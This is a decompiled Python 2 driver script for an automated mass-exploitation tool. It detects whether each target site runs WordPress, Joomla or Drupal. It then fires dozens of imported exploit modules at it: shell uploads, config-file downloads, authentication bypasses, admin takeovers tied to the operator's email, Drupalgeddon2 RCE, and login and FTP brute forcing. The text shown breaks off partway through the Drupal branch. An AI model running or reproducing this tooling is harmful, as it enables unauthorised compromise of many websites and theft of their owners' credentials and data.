# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41)
# [GCC 9.3.0]
# Embedded file name: v14.py
YOUR_Email_For_TAkeAdmin_Exploit = open('files/YOUREMAIL.txt', 'r').read()
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
from subprocess import check_output
from Tools import cms
import sys, os, threading, time, re
from multiprocessing import Pool, freeze_support
from random import randint
try:
    import requests
except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()

try:
    os.mkdir('result')
except:
    pass

try:
    os.mkdir('cms')
except:
    pass

from Exploits import Presta_1attributewizardpro
from Exploits import Presta_advancedslider
from Exploits import Presta_attributewizardpro
from Exploits import Presta_attributewizardpro3
from Exploits import Presta_attributewizardpro_x
from Exploits import Presta_cartabandonmentpro
from Exploits import Presta_columnadverts
from Exploits import Presta_fieldvmegamenu
from Exploits import Presta_homepageadvertise
from Exploits import Presta_homepageadvertise2
from Exploits import Presta_jro_homepageadvertise
from Exploits import Presta_lib
from Exploits import Presta_megamenu
from Exploits import Presta_nvn_export_orders
from Exploits import Presta_pk_flexmenu
from Exploits import Presta_productpageadverts
from Exploits import Presta_psmodthemeoptionpanel
from Exploits import Presta_simpleslideshow
from Exploits import Presta_soopabanners
from Exploits import Presta_soopamobile
from Exploits import Presta_tdpsthemeoptionpanel
from Exploits import Presta_videostab
from Exploits import Presta_vtermslideshow
from Exploits import Presta_wdoptionpanel
from Exploits import Presta_wg24themeadministration
from Exploits import cartabandonmentproOld
from Exploits import cherry_plugin
from Exploits import CVE_2008_3362Download_Manager
from Exploits import CVE_2014_4725wysija
from Exploits import CVE_2014_9735_revsliderShell
from Exploits import wpConfigDownload
from Exploits import CVE_2015_4455_gravityforms
from Exploits import CVE_2015_4455_gravityformsindex
from Exploits import CVE_2015_5151_revsliderCSS
from Exploits import CVE_2017_16562userpro
from Exploits import CVE_2018_19207wp_gdpr_compliance
from Exploits import CVE_2019_9879wp_graphql
from Exploits import formcraft
from Exploits import Headway
from Exploits import pagelinesExploit
from Exploits import WooCommerce_ProductAddonsExp
from Exploits import WpCateGory_page_icons
from Exploits import Wp_addblockblocker
from Exploits import wp_barclaycart
from Exploits import wp_content_injection
from Exploits import wp_eshop_magic
from Exploits import Wp_HD_WebPlayer
from Exploits import Wp_Job_Manager
from Exploits import wp_miniaudioplayer
from Exploits import Wp_pagelines
from Exploits import WP_User_Frontend
from Exploits import viral_optinsExploit
from Exploits import CVE_2019_9978SocialWarfare
from Exploits import WPJekyll_Exporter
from Exploits import Wp_cloudflare
from Exploits import Wprealia
from Exploits import Wpwoocommercesoftware
from Exploits import Wp_enfold_child
from Exploits import Wp_contabileads
from Exploits import Wp_prh_api
from Exploits import Wp_dzs_videogallery
from Exploits import Wp_mmplugin
from Exploits import wpinstall
from Exploits import CVE_2020_8772_wpInfinitewp_authBypass
from BruteForce import Wordpress
from BruteForce import FTPBruteForce
from Exploits import Com_adsmanager
from Exploits import Com_alberghi
from Exploits import Com_CCkJseblod
from Exploits import Com_extplorer
from Exploits import Com_Fabric
from Exploits import Com_FoxContent
from Exploits import Com_b2jcontact
from Exploits import Com_bt_portfolio
from Exploits import Com_civicrm
from Exploits import Com_jwallpapers
from Exploits import Com_oziogallery
from Exploits import Com_redmystic
from Exploits import Com_simplephotogallery
from Exploits import megamenu
from Exploits import mod_simplefileuploadv1
from Exploits import Com_facileforms
from Exploits import Com_Hdflvplayer
from Exploits import Com_Jbcatalog
from Exploits import Com_JCE
from Exploits import com_jdownloads
from Exploits import Com_JCEindex
from Exploits import Com_Joomanager
from Exploits import Com_Macgallery
from Exploits import com_media
from Exploits import Com_Myblog
from Exploits import Com_rokdownloads
from Exploits import Com_s5_media_player
from Exploits import Com_SexyContactform
from Exploits import CVE_2015_8562RCEjoomla
from Exploits import CVE_2015_8562RCEjoomla2019
from Exploits import CVE_2016_9838TakeAdminJoomla
from BruteForce import Joomla
from Exploits import CVE_2014_3704Drupal_add_Admin
from Exploits import CVE_2018_7600Drupalgeddon2
from Exploits import CVE_2019_6340Drupal8RESTful
from Exploits import Drupal_mailchimp
from Exploits import phpcurlclass
from BruteForce import Drupal
from Exploits import osCommerce
from BruteForce import Opencart
from Exploits import CVE_2019_16759vBulletinRCE
from Exploits import CVE_2006_2529fckeditor
from Exploits import phpunit
from Exploits import env
from Tools import Sqli

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])


def Banner():
    bb = open('files/banner.txt', 'r').read()
    print bb.format(r, g, r, w, r, y, w)


def options():
    option = ('\n    {}USAGE {}\n      [{}python JEx.py {}list.txt{}\n       python JEx.py {}Dork{}{}]\n    ').format(r, w, c, g, c, g, c, w)
    print option


def Rez(site, i):
    try:
        if 'YES' in str(i):
            print (' {}+ {}{} {}--> {}{} {}YES!{}').format(g, w, site, c, y, i[2], g, w)
        else:
            print (' {}- {}{} {}--> {}{} {}NO!{}').format(r, w, site, c, y, i[2], r, w)
    except:
        print (' {}- {}{} {}--> {}{} {}NO!{}').format(r, w, site, c, y, i[2], r, w)


def MultiThreadScan(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith('https://'):
            site = site.replace('https://', '')
        Check_CMs = cms.DetectCMS(site)
        if Check_CMs == 'wordpress':
            i = CVE_2020_8772_wpInfinitewp_authBypass.GET_USerS(site)
            Rez(site, i)
            i = CVE_2019_9978SocialWarfare.Exploit(site)
            Rez(site, i)
            i = cherry_plugin.Exploit(site)
            Rez(site, i)
            i = CVE_2008_3362Download_Manager.Exploit(site)
            Rez(site, i)
            i = CVE_2014_4725wysija.Exploit(site)
            Rez(site, i)
            i = CVE_2014_9735_revsliderShell.Exploit(site)
            Rez(site, i)
            i = wpConfigDownload.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityformsindex.Exploit(site)
            Rez(site, i)
            i = CVE_2015_4455_gravityforms.Exploit(site)
            Rez(site, i)
            i = CVE_2015_5151_revsliderCSS.Exploit(site)
            Rez(site, i)
            i = CVE_2017_16562userpro.Exploit(site)
            Rez(site, i)
            i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = formcraft.Exploit(site)
            Rez(site, i)
            i = Wp_contabileads.Exploit(site)
            Rez(site, i)
            i = Wp_prh_api.Exploit(site)
            Rez(site, i)
            i = Wp_mmplugin.Exploit(site)
            Rez(site, i)
            i = Wp_dzs_videogallery.Exploit(site)
            Rez(site, i)
            i = Headway.Exploit(site)
            Rez(site, i)
            i = pagelinesExploit.Exploit(site)
            Rez(site, i)
            i = WooCommerce_ProductAddonsExp.Exploit(site)
            Rez(site, i)
            i = WpCateGory_page_icons.Exploit(site)
            Rez(site, i)
            i = Wp_addblockblocker.Exploit(site)
            Rez(site, i)
            i = wp_barclaycart.Exploit(site)
            Rez(site, i)
            i = wp_content_injection.Exploit(site)
            Rez(site, i)
            i = wp_eshop_magic.Exploit(site)
            Rez(site, i)
            i = WPJekyll_Exporter.Exploit(site)
            Rez(site, i)
            i = Wp_cloudflare.Exploit(site)
            Rez(site, i)
            i = Wprealia.Exploit(site)
            Rez(site, i)
            i = Wpwoocommercesoftware.Exploit(site)
            Rez(site, i)
            i = Wp_enfold_child.Exploit(site)
            Rez(site, i)
            i = Wp_HD_WebPlayer.Exploit(site)
            Rez(site, i)
            i = Wp_Job_Manager.Exploit(site)
            Rez(site, i)
            i = wp_miniaudioplayer.Exploit(site)
            Rez(site, i)
            i = Wp_pagelines.Exploit(site)
            Rez(site, i)
            i = WP_User_Frontend.Exploit(site)
            Rez(site, i)
            i = viral_optinsExploit.Exploit(site)
            Rez(site, i)
            i = wpinstall.Check(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Wordpress')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Wordpress')
            Rez(site, i)
            mkobj = Wordpress.Wordpress()
            i = mkobj.UserName_Enumeration(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
            FTPBruteForce.Exploit(site)
        elif Check_CMs == 'joomla':
            i = CVE_2015_8562RCEjoomla.Exploit(site)
            Rez(site, i)
            i = CVE_2015_8562RCEjoomla2019.exploit(site)
            Rez(site, i)
            i = CVE_2016_9838TakeAdminJoomla.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
            Rez(site, i)
            i = com_jdownloads.Exploit(site)
            Rez(site, i)
            i = Com_FoxContent.Exploit(site)
            Rez(site, i)
            i = Com_b2jcontact.Exploit(site)
            Rez(site, i)
            i = Com_bt_portfolio.Exploit(site)
            Rez(site, i)
            i = Com_civicrm.Exploit(site)
            Rez(site, i)
            i = Com_jwallpapers.Exploit(site)
            Rez(site, i)
            i = Com_oziogallery.Exploit(site)
            Rez(site, i)
            i = Com_redmystic.Exploit(site)
            Rez(site, i)
            i = Com_simplephotogallery.Exploit(site)
            Rez(site, i)
            i = megamenu.Exploit(site)
            Rez(site, i)
            i = mod_simplefileuploadv1.Exploit(site)
            Rez(site, i)
            i = Com_JCE.Exploit(site)
            Rez(site, i)
            i = Com_JCEindex.Exploit(site)
            Rez(site, i)
            i = com_media.Exploit(site)
            Rez(site, i)
            i = Com_Myblog.Exploit(site)
            Rez(site, i)
            i = Com_adsmanager.Exploit(site)
            Rez(site, i)
            i = Com_alberghi.Exploit(site)
            Rez(site, i)
            i = Com_CCkJseblod.Exploit(site)
            Rez(site, i)
            i = Com_extplorer.Exploit(site)
            Rez(site, i)
            i = Com_Fabric.Exploit(site)
            Rez(site, i)
            i = Com_facileforms.Exploit(site)
            Rez(site, i)
            i = Com_Hdflvplayer.Exploit(site)
            Rez(site, i)
            i = Com_Jbcatalog.Exploit(site)
            Rez(site, i)
            i = Com_Joomanager.Exploit(site)
            Rez(site, i)
            i = Com_Macgallery.Exploit(site)
            Rez(site, i)
            i = Com_rokdownloads.Exploit(site)
            Rez(site, i)
            i = Com_s5_media_player.Exploit(site)
            Rez(site, i)
            i = Com_SexyContactform.Exploit(site)
            Rez(site, i)
            i = CVE_2006_2529fckeditor.Exploit(site, 'Joomla')
            Rez(site, i)
            i = phpunit.Exploit(site, 'Joomla')
            Rez(site, i)
            mkobj = Joomla.JooMLaBruteForce()
            i = mkobj.Run(site)
            Rez(site, i)
            i = env.Exploit(site)
            Rez(site, i)
        elif Check_CMs == 'drupal':
            i = CVE_2014_3704Drupal_add_Admin.Exploit(site)
            Rez(site, i)
            i = CVE_2018_7600Drupalgeddon2.Exploit(site)
            Rez(site, i)
            i = Drupal_mailchimp.Exploit(site)
            Rez(site, i)
    